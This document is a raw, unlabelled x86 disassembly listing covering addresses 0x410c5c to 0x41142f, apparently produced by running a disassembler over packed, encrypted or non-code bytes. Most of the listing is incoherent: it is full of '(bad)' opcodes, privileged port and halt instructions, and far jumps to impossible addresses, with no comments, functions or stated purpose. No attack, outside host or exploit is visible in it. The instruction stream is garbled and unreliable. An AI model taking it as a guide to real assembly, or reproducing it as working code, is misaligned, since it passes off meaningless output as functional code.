  410c5c:	add    ah,ch
  410c5e:	add    edx,esp
  410c60:	pop    edi
  410c61:	pop    ebp
  410c62:	push   ebp
  410c63:	inc    ebx
  410c64:	in     al,dx
  410c65:	pop    ebp
  410c66:	in     al,dx
  410c67:	cmp    edx,DWORD PTR [edi-0x8]
  410c6a:	xor    eax,0x895b9c94
  410c6f:	leave  
  410c70:	call   0x89965379
  410c75:	in     al,dx
  410c76:	in     al,0x45
  410c78:	dec    ebp
  410c79:	push   esi
  410c7a:	test   DWORD PTR [eax+0xfb010f],esi
  410c80:	add    BYTE PTR [eax+0xc018b],dh
  410c86:	leave  
  410c87:	inc    ebp
  410c88:	test   al,ch
  410c8a:	add    dh,bh
  410c8c:	add    bh,bh
  410c8e:	dec    ebp
  410c8f:	push   cs
  410c90:	mov    DWORD PTR [ecx],eax
  410c92:	hlt    
  410c93:	push   es
  410c94:	dec    ebp
  410c95:	leave  
  410c96:	mov    DWORD PTR [eax],ecx
  410c98:	clc    
  410c99:	cmovge eax,ecx
  410c9c:	mov    ecx,0x85c2f0
  410ca2:	clc    
  410ca3:	pop    DWORD PTR [ebp+0x1]
  410ca6:	push   ebx
  410ca7:	add    BYTE PTR [ebp-0x15],bh
  410caa:	push   esi
  410cab:	xor    eax,0x898a45
  410cb0:	cld    
  410cb1:	push   es
  410cb2:	inc    ebp
  410cb3:	add    BYTE PTR [ebx],dh
  410cb5:	pushfw 
  410cb7:	add    DWORD PTR [esi+0x78308c1],edi
  410cbd:	add    ah,BYTE PTR [ebx-0x49]
  410cc0:	int    0xbb
  410cc2:	mov    ecx,DWORD PTR [esi+0xc]
  410cc5:	add    dh,al
  410cc7:	cmp    ecx,ebx
  410cc9:	jne    0x410c93
  410ccb:	xor    ecx,DWORD PTR [ebp+0x66]
  410cce:	jmp    0xc80cd4
  410cd3:	add    DWORD PTR [ebp+0x0],eax
  410cd6:	mov    eax,ebx
  410cd8:	or     al,0x8b
  410cda:	(bad)  
  410cdb:	mov    ecx,esi
  410cdd:	mov    BYTE PTR [eax+eax*1+0x664c13a],cl
  410ce4:	mov    eax,edi
  410ce6:	or     BYTE PTR [edx],cl
  410ce8:	shl    cl,cl
  410cea:	icebp  
  410ceb:	add    BYTE PTR [ebp+0x36],0x8b
  410cef:	or     BYTE PTR [edx+eax*2],cl
  410cf2:	(bad)  
  410cf3:	or     cl,dh
  410cf5:	stc    
  410cf6:	shl    DWORD PTR [ebp-0x30],0xc6
  410cfa:	xor    al,0x0
  410cfc:	inc    ebp
  410cfd:	xchg   BYTE PTR [ebx],al
  410cff:	add    esp,edi
  410d01:	add    BYTE PTR [ebp-0x39],cl
  410d04:	mov    al,bl
  410d06:	test   DWORD PTR [ebx+0x1c348375],ecx
  410d0c:	sub    al,0xbf
  410d0e:	jmp    0x410c95
  410d10:	mov    edi,eax
  410d12:	lock jge 0x410d06
  410d15:	lea    esi,[edx-0x74bad503]
  410d1b:	mov    ebp,esp
  410d1d:	or     cl,dh
  410d1f:	leave  
  410d20:	add    al,BYTE PTR [eax+eax*4-0x37ff9d00]
  410d27:	dec    ebp
  410d28:	dec    ebp
  410d29:	test   DWORD PTR [ebx],eax
  410d2b:	paddb  mm6,mm0
  410d2e:	add    DWORD PTR [eax],eax
  410d30:	dec    ebp
  410d31:	mov    ecx,DWORD PTR [ebx-0x62b217f0]
  410d37:	mov    esi,DWORD PTR [edx]
  410d39:	or     al,0x2b
  410d3b:	dec    ebp
  410d3c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410d42:	mov    esp,ebp
  410d44:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410d4b:	mov    DWORD PTR [ebx],ebp
  410d4d:	call   0xc74967d
  410d52:	mov    DWORD PTR [ebp+0x10],ecx
  410d55:	(bad)  
  410d56:	push   0x8b85ff10
  410d5b:	clc    
  410d5c:	or     al,0x56
  410d5e:	(bad)  
  410d5f:	push   ecx
  410d60:	retf   
  410d61:	mov    ebx,0xff4d8dc8
  410d66:	mov    DWORD PTR [ebp+0x8],eax
  410d69:	xor    eax,DWORD PTR [ebp-0x75]
  410d6c:	cmp    ebp,DWORD PTR [ebx]
  410d6e:	lsl    ebx,WORD PTR [edi-0x8]
  410d72:	call   DWORD PTR [ebx-0x741bff75]
  410d78:	(bad)  
  410d79:	or     al,0x5b
  410d7b:	dec    ebp
  410d7c:	or     BYTE PTR [ebx],dh
  410d7e:	inc    ebp
  410d7f:	xor    esi,DWORD PTR ds:0x708088d
  410d85:	in     eax,0x9d
  410d87:	add    BYTE PTR [edx],dh
  410d89:	inc    ebp
  410d8a:	pop    edi
  410d8b:	xor    eax,edx
  410d8d:	test   DWORD PTR [eax],0x83108b8b
  410d93:	dec    ebp
  410d94:	adc    al,0x33
  410d96:	inc    ebp
  410d97:	xor    esi,DWORD PTR ds:0xc73b9c2b
  410d9d:	jne    0x410d9b
  410d9f:	mov    eax,DWORD PTR [ebp+0x345f808]
  410da5:	mov    eax,DWORD PTR [ebp-0xc]
  410da8:	mov    DWORD PTR [eax],0x685c9f4
  410dae:	clc    
  410daf:	dec    eax
  410db0:	push   edi
  410db1:	ss inc ebp
  410db3:	pop    ss
  410db4:	aad    0x4d
  410db6:	xlat   BYTE PTR ds:[ebx]
  410db7:	or     BYTE PTR [ebx+0x4d63fc56],0xd1
  410dbe:	mov    eax,0x780084d
  410dc3:	push   esi
  410dc4:	clc    
  410dc5:	ret    0xe99d
  410dc8:	xor    dl,dl
  410dca:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410dd0:	js     0x88799cf
  410dd6:	dec    ebp
  410dd7:	push   ebp
  410dd8:	mov    edi,DWORD PTR [eax+0xc872fc]
  410dde:	lock enter 0xceca,0xf2
  410de3:	retf   0x18ce
  410de6:	jne    0x410e35
  410de8:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410dee:	enter  0xf0d6,0xca
  410df2:	retf   0xf2c8
  410df5:	into   
  410df6:	out    dx,al
  410df7:	dec    ebp
  410df8:	dec    ebp
  410df9:	jmp    0xff450d31
  410dfe:	xor    eax,DWORD PTR [ebp-0x15]
  410e01:	xor    esi,DWORD PTR [ebx]
  410e03:	mov    esi,DWORD PTR [ebx]
  410e05:	sub    eax,DWORD PTR [ebx]
  410e07:	add    eax,DWORD PTR [ebx]
  410e09:	or     bl,dl
  410e0b:	dec    ebp
  410e0c:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410e12:	xor    eax,DWORD PTR [ebp-0xf00073]
  410e18:	jb     0x410e5f
  410e1a:	add    BYTE PTR [ebx],dh
  410e1c:	dec    ebp
  410e1d:	pop    esi
  410e1e:	mov    ebp,ebx
  410e20:	cld    
  410e21:	mov    esi,eax
  410e23:	call   0x520f64f0
  410e28:	stc    
  410e29:	add    eax,0x4572aa
  410e2e:	pop    edi
  410e2f:	leave  
  410e30:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410e37:	in     al,dx
  410e38:	mov    eax,edi
  410e3a:	xor    eax,0xf8008520
  410e40:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410e47:	mov    eax,DWORD PTR [ebp-0x77]
  410e4a:	xor    bh,al
  410e4c:	pushf  
  410e4d:	inc    ebp
  410e4e:	(bad)  
  410e4f:	cmp    eax,0x56869ce8
  410e54:	clc    
  410e55:	mov    edi,0x8518e4ec
  410e5b:	jmp    0xf056:0x8b457df8
  410e62:	push   esi
  410e63:	push   esi
  410e64:	push   ecx
  410e65:	push   ecx
  410e66:	push   edi
  410e67:	xor    eax,esi
  410e69:	mov    edx,0x32729d
  410e6e:	add    ecx,eax
  410e70:	mov    edx,edi
  410e72:	clc    
  410e73:	retf   0xaf45
  410e76:	cmp    eax,0xc78b9ceb
  410e7b:	clc    
  410e7c:	cld    
  410e7d:	jne    0x410e97
  410e7f:	xor    ebp,edx
  410e81:	xor    eax,DWORD PTR [ebp+0x3]
  410e84:	or     BYTE PTR [ebx],al
  410e86:	add    BYTE PTR [ebp-0x7747475],al
  410e8c:	hlt    
  410e8d:	dec    ebp
  410e8e:	dec    ebp
  410e8f:	je     0x410ec4
  410e91:	xor    esi,DWORD PTR [ebx]
  410e93:	xor    eax,DWORD PTR [ebx]
  410e95:	add    eax,DWORD PTR [ebx]
  410e97:	add    ecx,DWORD PTR [edi]
  410e99:	rol    ecx,cl
  410e9b:	mov    esi,DWORD PTR [ecx]
  410e9d:	in     al,dx
  410e9e:	inc    ebp
  410e9f:	enter  0xca2b,0x33
  410ea3:	icebp  
  410ea4:	mov    DWORD PTR [edx],ecx
  410ea6:	clc    
  410ea7:	lock pop ebp
  410ea9:	enter  0xf2e8,0xfe
  410ead:	retf   0xeeff
  410eb0:	inc    ebp
  410eb1:	jne    0x410e3e
  410eb3:	mov    edi,eax
  410eb5:	cld    
  410eb6:	dec    ebp
  410eb7:	enter  0xbc89,0x8d
  410ebb:	popf   
  410ebc:	sti    
  410ebd:	xor    bh,bh
  410ebf:	mov    eax,DWORD PTR [ebp-0xc]
  410ec2:	mov    esi,DWORD PTR [ebp-0x4]
  410ec5:	xor    eax,esi
  410ec7:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9d]
  410ece:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410ed4:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410eda:	(bad)  
  410edb:	push   ebp
  410edc:	shr    esp,0x4d
  410edf:	in     al,dx
  410ee0:	cmp    eax,DWORD PTR [esi+esi*2]
  410ee3:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  410ee9:	pushf  
  410eea:	mov    edi,0x85c7f445
  410ef0:	call   0xf88695ed
  410ef5:	xor    eax,0x53619cdb
  410efa:	dec    ebp
  410efb:	inc    ebp
  410efc:	mov    esi,DWORD PTR [eax+edi*8]
  410eff:	pushf  
  410f00:	into   
  410f01:	mov    ecx,edi
  410f03:	in     al,dx
  410f04:	call   0x8b4954c7
  410f09:	pop    es
  410f0a:	or     BYTE PTR [ebx],dh
  410f0c:	or     BYTE PTR [edi+0x8a724d],bh
  410f12:	or     eax,edi
  410f14:	push   ebp
  410f15:	inc    ebp
  410f16:	cmpxchg8b (bad)
  410f17:	(bad)  
  410f18:	leave  
  410f19:	loopne 0x410ee5
  410f1b:	test   DWORD PTR [ebp-0x8],ecx
  410f1e:	mov    eax,DWORD PTR [ebp-0x18]
  410f21:	aad    0x55
  410f23:	xlat   BYTE PTR ds:[ebx]
  410f24:	xor    eax,edi
  410f26:	add    esi,eax
  410f28:	and    eax,DWORD PTR [eax]
  410f2a:	mov    eax,DWORD PTR [eax]
  410f2c:	(bad)  
  410f2d:	leave  
  410f2e:	sti    
  410f2f:	inc    ebp
  410f30:	dec    DWORD PTR [ebx-0x39cc13ab]
  410f36:	mov    esi,ecx
  410f38:	clc    
  410f39:	(bad)  
  410f3a:	dec    ebp
  410f3b:	iret   
  410f3c:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410f42:	jb     0x410f40
  410f44:	add    bh,al
  410f46:	inc    ebp
  410f47:	(bad)  
  410f48:	mov    eax,DWORD PTR [ebp-0xc]
  410f4b:	(bad)  
  410f4c:	xabort 0x63
  410f4f:	loopne 0x410f1e
  410f51:	jmp    FWORD PTR [ebx]
  410f53:	mov    DWORD PTR [ebx],eax
  410f55:	clc    
  410f56:	lock inc ebp
  410f58:	dec    ebp
  410f59:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410f5f:	loopne 0x410f94
  410f61:	inc    DWORD PTR [ebx]
  410f63:	mov    edi,DWORD PTR [ebx]
  410f65:	hlt    
  410f66:	jne    0x410fb5
  410f68:	mov    esi,DWORD PTR [ebx]
  410f6a:	in     al,0x8d
  410f6c:	dec    ebp
  410f6d:	or     BYTE PTR [ebx],dh
  410f6f:	jb     0x410f74
  410f71:	add    BYTE PTR [edi+0x45],bl
  410f74:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410f7a:	add    BYTE PTR [ebx],dh
  410f7c:	mov    esi,DWORD PTR [ebx]
  410f7e:	mov    ebp,DWORD PTR [ebx]
  410f80:	sbb    BYTE PTR [ebx-0x377403b3],cl
  410f86:	nop
  410f87:	mov    ecx,0x338b4500
  410f8c:	add    DWORD PTR [ebx],0x70
  410f8f:	mov    DWORD PTR [esi-0x8],edx
  410f92:	jne    0x410fd9
  410f94:	mov    esi,DWORD PTR [edi+edx*2]
  410f97:	pushf  
  410f98:	push   esi
  410f99:	mov    edx,DWORD PTR [ecx-0x15]
  410f9c:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  410fa2:	add    BYTE PTR [ebx],dh
  410fa4:	retf   
  410fa5:	add    edx,ecx
  410fa7:	ror    DWORD PTR [edi],cl
  410fa9:	mov    DWORD PTR ds:0x7f452dfc,ebp
  410faf:	mov    ch,dl
  410fb1:	mov    BYTE PTR [eax+0xb],dh
  410fb4:	fimul  WORD PTR [ebp+0x0]
  410fb7:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  410fbd:	xor    esi,DWORD PTR [ebx]
  410fbf:	mov    DWORD PTR [ebx],esi
  410fc1:	or     BYTE PTR [ebx],al
  410fc3:	dec    ebp
  410fc4:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  410fca:	or     edi,0x8c64ca9c
  410fd0:	out    dx,eax
  410fd1:	loopne 0x410fe8
  410fd3:	(bad)  
  410fd4:	jmp    0x13d1464
  410fd9:	retf   0x4d4d
  410fdc:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  410fe2:	je     0x3241ad8c
  410fe8:	mov    ecx,DWORD PTR [ecx+0x45450818]
  410fee:	mov    DWORD PTR [ebx],esi
  410ff0:	sbb    BYTE PTR [ecx-0x7472b3],bh
  410ff6:	mov    eax,ecx
  410ff8:	fmul   DWORD PTR [ebp+0x45]
  410ffb:	mov    DWORD PTR ds:0xba459cf0,esi
  411001:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  411007:	(bad)  
  411008:	mov    ecx,eax
  41100a:	sbb    BYTE PTR [ecx-0x7474babb],dl
  411010:	sbb    al,bh
  411012:	add    dh,0x1
  411015:	mov    DWORD PTR [eax],0x4dc1005e
  41101b:	leave  
  41101c:	mov    eax,DWORD PTR [eax+ebx*1]
  41101f:	push   ebp
  411020:	mov    esp,ebp
  411022:	add    DWORD PTR [ebp+0x0],eax
  411025:	mov    ecx,DWORD PTR [ecx]
  411027:	or     BYTE PTR [eax-0x80],cl
  41102a:	mov    DWORD PTR [ecx],eax
  41102c:	or     al,0x0
  41102e:	inc    ebp
  41102f:	add    BYTE PTR [ebx],dh
  411031:	in     al,dx
  411032:	add    edx,DWORD PTR [ebx-0x77]
  411035:	mov    esi,esp
  411037:	adc    BYTE PTR [ebp+0x16],al
  41103a:	xor    edi,DWORD PTR [edi+0x7890803]
  411040:	adc    al,0xcf
  411042:	inc    ebp
  411043:	popf   
  411044:	mov    esi,DWORD PTR [edx]
  411046:	push   eax
  411047:	add    ebp,eax
  411049:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  41104f:	pushf  
  411050:	mov    esp,DWORD PTR [eax+edi*1+0x44]
  411054:	dec    ebp
  411055:	fwait
  411056:	dec    eax
  411057:	jmp    0xcc149d
  41105c:	or     al,0x4d
  41105e:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  411064:	or     al,0xd7
  411066:	dec    ecx
  411067:	retf   
  411068:	dec    eax
  411069:	rcl    eax,cl
  41106b:	retf   0xfc8
  41106e:	inc    ebp
  41106f:	or     eax,0x7f382d8b
  411074:	sar    esp,0x3
  411077:	lahf   
  411078:	inc    eax
  411079:	mov    ebp,0x8b180089
  41107e:	inc    ebp
  41107f:	or     BYTE PTR [ebx],dh
  411081:	iret   
  411082:	add    ecx,ebx
  411084:	mov    ecx,eax
  411086:	adc    al,0x84
  411088:	inc    ebp
  411089:	add    al,0x33
  41108b:	add    BYTE PTR [ebx],al
  41108d:	dec    ebp
  41108e:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  411094:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  41109a:	ret    
  41109b:	inc    ebp
  41109c:	add    edi,eax
  41109e:	push   ebp
  41109f:	or     bh,al
  4110a1:	test   DWORD PTR [eax+edi*8],edx
  4110a4:	test   DWORD PTR [edx],esi
  4110a6:	clc    
  4110a7:	pushf  
  4110a8:	inc    ebp
  4110a9:	mov    DWORD PTR [eax],esi
  4110ab:	lock pushf 
  4110ad:	inc    ebp
  4110ae:	(bad)  
  4110af:	mov    DWORD PTR [eax+ebx*1],edx
  4110b2:	test   DWORD PTR [ebp-0x8],eax
  4110b5:	mov    eax,DWORD PTR [ebp-0x70]
  4110b8:	mov    eax,DWORD PTR [eax]
  4110ba:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  4110c0:	scas   eax,DWORD PTR es:[edi]
  4110c1:	dec    ebp
  4110c2:	mov    ecx,DWORD PTR [ebx+0x559008]
  4110c8:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
  4110ce:	jb     0x41111d
  4110d0:	add    BYTE PTR [ebx-0x387cf73f],cl
  4110d6:	add    eax,ebx
  4110d8:	add    BYTE PTR [ebp+0x45],al
  4110db:	mov    esi,DWORD PTR [ebx]
  4110dd:	or     BYTE PTR [ebx],al
  4110df:	(bad)  
  4110e0:	mov    ebx,eax
  4110e2:	adc    al,0x45
  4110e4:	inc    ebp
  4110e5:	mov    eax,DWORD PTR [ebx]
  4110e7:	or     al,0xdc
  4110e9:	inc    eax
  4110ea:	inc    ebp
  4110eb:	cmp    edi,0xc
  4110ee:	hlt    
  4110ef:	inc    ebp
  4110f0:	jne    0x41107d
  4110f2:	mov    ecx,DWORD PTR [esp+ecx*1]
  4110f5:	inc    eax
  4110f6:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  4110fc:	clc    
  4110fd:	push   esp
  4110fe:	inc    ebp
  4110ff:	inc    ebp
  411100:	cmp    eax,0x8b8b9c74
  411105:	cmp    al,ah
  411107:	dec    ebp
  411108:	(bad)  
  411109:	mov    eax,ebx
  41110b:	push   esp
  41110c:	(bad)  
  41110d:	idiv   DWORD PTR [eax-0x87417dd]
  411113:	or     al,0xff
  411115:	inc    eax
  411116:	inc    ebp
  411117:	add    eax,DWORD PTR [ebp-0x74748b15]
  41111d:	push   esp
  41111e:	loopne 0x411165
  411120:	(bad)  
  411121:	mov    eax,ebx
  411123:	or     bh,bh
  411125:	xbegin 0x508656ee
  41112b:	mov    ebx,esp
  41112d:	or     bh,bh
  41112f:	(bad)  
  411130:	mov    eax,ebx
  411132:	hlt    
  411133:	inc    ebp
  411134:	inc    ebp
  411135:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  41113b:	xor    ebp,DWORD PTR [ebx]
  41113d:	add    ecx,DWORD PTR [ecx+0x4589e089]
  411143:	adc    al,0x8b
  411145:	inc    ebp
  411146:	clc    
  411147:	xor    eax,DWORD PTR [eax-0x64]
  41114a:	add    eax,edi
  41114c:	or     al,0x14
  41114e:	dec    ebp
  41114f:	test   DWORD PTR [ebx],edi
  411151:	clc    
  411152:	jb     0x411199
  411154:	mov    esi,DWORD PTR [ecx]
  411156:	clc    
  411157:	pushf  
  411158:	inc    eax
  411159:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  41115f:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  411165:	shr    esi,0x4d
  411168:	add    BYTE PTR [ebx-0x30002f96],cl
  41116e:	hlt    
  41116f:	mov    WORD PTR [ebp-0x63],es
  411172:	push   eax
  411173:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  41117a:	test   DWORD PTR [eax],eax
  41117c:	clc    
  41117d:	mov    eax,DWORD PTR [ebp+0x8]
  411180:	mov    edi,0x4585c3c8
  411186:	clc    
  411187:	mov    eax,DWORD PTR [ebp+0x18]
  41118a:	xor    eax,DWORD PTR [ebp-0x64]
  41118d:	mov    edi,eax
  41118f:	hlt    
  411190:	shl    BYTE PTR [ebp-0x7b],0x8b
  411194:	clc    
  411195:	fmul   QWORD PTR [ebp+0x4d]
  411198:	mov    eax,ebp
  41119a:	in     al,dx
  41119b:	icebp  
  41119c:	dec    ebp
  41119d:	dec    DWORD PTR [ecx+0x4dc7e845]
  4111a3:	loopne 0x41112e
  4111a5:	test   eax,edi
  4111a7:	clc    
  4111a8:	dec    ebp
  4111a9:	inc    ebp
  4111aa:	mov    DWORD PTR [ebx],esi
  4111ac:	in     al,0x3
  4111ae:	dec    ebp
  4111af:	push   eax
  4111b0:	xor    eax,DWORD PTR [ebp+0x3]
  4111b3:	push   eax
  4111b4:	mov    DWORD PTR [eax-0x20],edx
  4111b7:	push   edi
  4111b9:	mov    eax,DWORD PTR [eax]
  4111bb:	clc    
  4111bc:	cmp    eax,0xf84e85c0
  4111c1:	inc    ebp
  4111c2:	test   BYTE PTR [ebx],dh
  4111c4:	add    DWORD PTR [ebx],eax
  4111c6:	add    BYTE PTR [eax+0x4d],dl
  4111c9:	jne    0x4111fe
  4111cb:	lea    ecx,[ebx-0x7617fc48]
  4111d1:	cmc    
  4111d2:	adc    al,0xff
  4111d4:	inc    ebp
  4111d5:	inc    ebp
  4111d6:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  4111dc:	jb     0x411169
  4111de:	add    ah,bl
  4111e0:	inc    ebp
  4111e1:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  4111e8:	xor    ecx,DWORD PTR [ebp+0x3]
  4111eb:	mov    edi,DWORD PTR [ebx]
  4111ed:	adc    BYTE PTR [ebp+0x41],dh
  4111f0:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  4111f6:	ret    
  4111f7:	push   ss
  4111f8:	push   0x45
  4111fa:	lea    ecx,[ebx+0x4de80cac]
  411200:	cli    
  411201:	add    edi,edi
  411203:	or     BYTE PTR [ebp+0x4d],al
  411206:	mov    ebp,DWORD PTR [ebx]
  411208:	xor    ebp,ecx
  41120a:	mov    al,BYTE PTR [edx]
  41120c:	add    eax,0xc7200
  411211:	jne    0x411260
  411213:	lea    esi,[ebx]
  411215:	lods   al,BYTE PTR ds:[esi]
  411216:	psubsb mm0,mm0
  411219:	cmc    
  41121a:	retf   
  41121b:	inc    ecx
  41121d:	xor    eax,0x89019c84
  411222:	add    ah,cl
  411224:	inc    ebp
  411225:	inc    ebp
  411226:	mov    esi,DWORD PTR [edx]
  411228:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c405c7]
  41122f:	test   DWORD PTR [eax],eax
  411231:	clc    
  411232:	dec    ebp
  411233:	inc    ebp
  411234:	xor    esi,DWORD PTR [eax]
  411236:	setl   al
  411239:	(bad)  
  41123a:	retf   
  41123b:	int3   
  41123c:	ror    DWORD PTR [ebp-0x7c],0x8d
  411240:	add    eax,ecx
  411242:	add    BYTE PTR [ebp+0x45],cl
  411245:	lea    ecx,[ebx-0x75b2cc3c]
  41124b:	lea    eax,ds:0x4d72c0
  411251:	mov    ecx,DWORD PTR [ebp+0x8]
  411254:	xor    ecx,edi
  411256:	bswap  ebx
  411258:	ror    BYTE PTR [ebp-0x35],0xe9
  41125c:	rol    DWORD PTR [ecx],0x84
  41125f:	add    BYTE PTR [ecx],al
  411261:	xor    eax,DWORD PTR [eax]
  411263:	pushf  
  411264:	inc    ebp
  411265:	jnp    0x8a414669
  41126b:	mov    eax,DWORD PTR ds:0xcf72f0
  411271:	lock dec ebp
  411273:	retf   
  411274:	xor    ecx,DWORD PTR [ebp+0xf]
  411277:	mov    eax,eax
  411279:	loopne 0x411246
  41127b:	test   ecx,0x19d8484
  411281:	xor    al,BYTE PTR [eax]
  411283:	mov    DWORD PTR [ebp-0x20],eax
  411286:	mov    eax,DWORD PTR [ebp+0x33]
  411289:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  41128f:	ret    
  411290:	add    al,cl
  411292:	dec    ebp
  411293:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  411299:	add    ecx,DWORD PTR ds:0xc7250
  41129f:	inc    ebp
  4112a0:	rcl    DWORD PTR [eax+0x4d],0x5f
  4112a4:	mov    edi,edi
  4112a6:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  4112ac:	jb     0x411275
  4112ae:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4112b5:	mov    esi,DWORD PTR [ebx]
  4112b7:	or     BYTE PTR [edx+0x72b60dcf],cl
  4112bd:	add    eax,DWORD PTR [eax]
  4112bf:	cmp    ecx,eax
  4112c1:	jne    0x41133f
  4112c7:	mov    eax,DWORD PTR [ebp-0x18]
  4112ca:	mov    eax,DWORD PTR [eax]
  4112cc:	xor    eax,edi
  4112ce:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4112d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d8:	mov    ecx,edi
  4112da:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4112e0:	jb     0x4112f1
  4112e2:	add    BYTE PTR [eax-0x3f],bl
  4112e5:	add    BYTE PTR [ebp-0x75],cl
  4112e8:	mov    edi,eax
  4112ea:	xor    eax,DWORD PTR [eax]
  4112ec:	mov    al,bh
  4112ee:	or     eax,0x497284
  4112f3:	xor    al,cl
  4112f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112f8:	mov    ecx,edi
  4112fa:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  411300:	jb     0x411311
  411302:	add    BYTE PTR [eax],bh
  411304:	enter  0x8500,0x8b
  411308:	add    ah,ah
  41130a:	add    BYTE PTR [eax],al
  41130c:	inc    ebp
  41130d:	(bad)  
  41130e:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  411315:	mov    esi,DWORD PTR [edx+0x8]
  411318:	add    bh,cl
  41131a:	dec    ebp
  41131b:	mov    dh,0x8b
  41131d:	add    esi,DWORD PTR [ebx]
  41131f:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  411325:	add    BYTE PTR [eax],al
  411327:	mov    eax,ecx
  411329:	call   0xc7cc137b
  41132e:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d49]
  411335:	mov    eax,DWORD PTR [eax]
  411337:	in     al,dx
  411338:	ror    DWORD PTR [ecx],0x4d
  41133b:	iret   
  41133c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  411343:	xor    dh,BYTE PTR [edx-0x75]
  411346:	add    al,bh
  411348:	enter  0x5009,0xcf
  41134c:	inc    ebp
  41134d:	mov    WORD PTR [ebx-0x75cdccb7],cs
  411353:	or     al,BYTE PTR ds:0xec728b
  411359:	or     DWORD PTR [ebp-0x31],ecx
  41135c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  411363:	cmp    dh,BYTE PTR [edx+0xf]
  411366:	add    ah,dl
  411368:	rol    DWORD PTR [eax],0x4d
  41136b:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  411371:	(bad)  
  411372:	or     eax,0x497284
  411377:	xor    al,cl
  411379:	mov    ecx,DWORD PTR [ebp-0x18]
  41137c:	mov    ecx,DWORD PTR [ecx]
  41137e:	xor    ecx,edi
  411380:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  411387:	xor    cl,al
  411389:	mov    edx,DWORD PTR [eax]
  41138b:	in     al,0x45
  41138d:	or     DWORD PTR [eax-0x31],edx
  411390:	mov    ds:0x8b49ff8c,eax
  411395:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  41139c:	inc    ebp
  41139d:	or     DWORD PTR [ebx],esi
  41139f:	iret   
  4113a0:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144d]
  4113a7:	cmp    dh,BYTE PTR [ebx]
  4113a9:	jge    0x7241443f
  4113af:	mov    eax,DWORD PTR [eax]
  4113b1:	in     al,0xc7
  4113b3:	add    BYTE PTR [ebp-0x39],cl
  4113b6:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b7]
  4113bd:	mov    edx,ecx
  4113bf:	clc    
  4113c0:	test   BYTE PTR [ecx],cl
  4113c2:	std    
  4113c3:	iret   
  4113c4:	dec    DWORD PTR [ebp+eax*2+0x14328b49]
  4113cb:	xor    al,bh
  4113cd:	mov    eax,ebx
  4113cf:	in     al,dx
  4113d0:	enter  0x1109,0xcf
  4113d4:	inc    ebp
  4113d5:	mov    WORD PTR [ebx-0x38cde7b7],cs
  4113db:	or     al,BYTE PTR [ebx+ecx*4+0x932f89d]
  4113e2:	jmp    0x4113b3
  4113e4:	push   0xffffff8c
  4113e6:	dec    DWORD PTR [ebp-0xc]
  4113e9:	xor    al,BYTE PTR [ebp+0x3a]
  4113ec:	push   eax
  4113ed:	jne    0x411409
  4113ef:	mov    edi,edi
  4113f1:	in     al,0x8b
  4113f3:	add    BYTE PTR [eax],cl
  4113f5:	(bad)  
  4113f6:	dec    ebp
  4113f7:	test   BYTE PTR [ebx],dh
  4113f9:	dec    ecx
  4113fa:	add    esi,DWORD PTR [edx]
  4113fc:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  411402:	or     bh,cl
  411404:	(bad)  
  411405:	mov    ebx,es
  411407:	dec    ecx
  411408:	push   0x32
  41140a:	lea    esi,[edx]
  41140c:	xchg   esp,eax
  41140d:	mov    ebp,eax
  41140f:	call   0xd0401e0c
  411414:	inc    ebp
  411415:	mov    WORD PTR [ebx+0x45321849],es
  41141b:	or     bh,bh
  41141d:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  411423:	iret   
  411424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411425:	mov    WORD PTR [ebp+0x4d],es
  411428:	push   eax
  411429:	xor    bl,dh
  41142b:	cmp    bh,bh
  41142d:	jne    0x4113ba
  41142f:	lea    ecx,[eax]
